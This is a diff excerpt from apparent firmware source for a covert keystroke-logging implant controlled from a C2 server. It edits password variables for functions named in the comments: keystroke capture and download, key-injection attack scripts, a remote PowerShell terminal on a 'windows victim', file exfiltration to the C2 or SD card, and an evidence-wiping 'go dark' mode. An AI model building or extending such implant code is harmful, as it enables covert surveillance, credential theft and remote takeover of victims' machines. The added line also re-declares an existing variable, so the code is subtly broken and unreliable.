@@ -50,16 +50,17 @@ String disableKeyTxPW = "DEFAULTdisableKeyTxPW";    //password for disabling sni
 String insomniaPW = "DEFAULTinsomniaPW";            //password for enabling insomnia mode                                   - main menu option 6
 String allowSleepPW = "DEFAULTallowSleepPW";        //password for disabling insomnia mode                                  - main menu option 7
 String goDarkPW = "DEFAULTgoDarkPW";                //password for wiping SD card - go dark mode                            - main menu option 11
-String injectPW = "DEFAULTinjectPW";                //password to enable key injection, run script from SD                  - main menu option 14
-String rxScriptPW = "DEFAULTrxScriptPW";            //password to transfer an attack script from C2 to SD                   - main menu option 15
-String resetPW = "DEFAULTresetPW";                  //password to reset all variables back to default                       - main menu option 18
-String deletePW = "DEFAULTdeletePW";                //password to delete a file on the SD card of a target implant          - main menu option 17
+String injectPW = "DEFAULTinjectPW";                //password to enable key injection, run script from SD                  - main menu option 15
+String rxScriptPW = "DEFAULTrxScriptPW";            //password to transfer an attack script from C2 to SD                   - main menu option 16
+String resetPW = "DEFAULTresetPW";                  //password to reset all variables back to default                       - main menu option 19
+String deletePW = "DEFAULTdeletePW";                //password to delete a file on the SD card of a target implant          - main menu option 18
 String sendKeysPW = "DEFAULTsendKeysPW";            //password for downloading keystroke recording file from SD to C2       - main menu option 10
 String printFilesPW = "DEFAULTprintFilesPW";        //password to print a list of the files on the SD card                  - main menu option 12
-String terminalPW = "DEFAULTterminalPW";            //password for starting a remote powershell terminal on windows victim  - main menu option 16 
-String terminalPWOFF = "DEFAULTterminalPWOFF";      //password for ending a remote powershell terminal on windows victim    - main menu option 16
+String terminalPW = "DEFAULTterminalPW";            //password for starting a remote powershell terminal on windows victim  - main menu option 17 
+String terminalPWOFF = "DEFAULTterminalPWOFF";      //password for ending a remote powershell terminal on windows victim    - main menu option 17
 String exfilPW = "DEFAULTexfilPW";                  //password for copying files from a windows victim to the C2            - main menu option 13
 String exfilPWOFF = "DEFAULTexfilPWOFF";            //password for ending copying files from a windows victim to the C2     - main menu option 13
+String exfilPW = "DEFAULTexfilPWSD";                //password for copying files from a windows victim to the SD Card       - main menu option 14
 
 //Toggle variables
 bool activate = false; // allow outgoing communication with C2 but do not accept commands until activated via C2 menu with the proper password
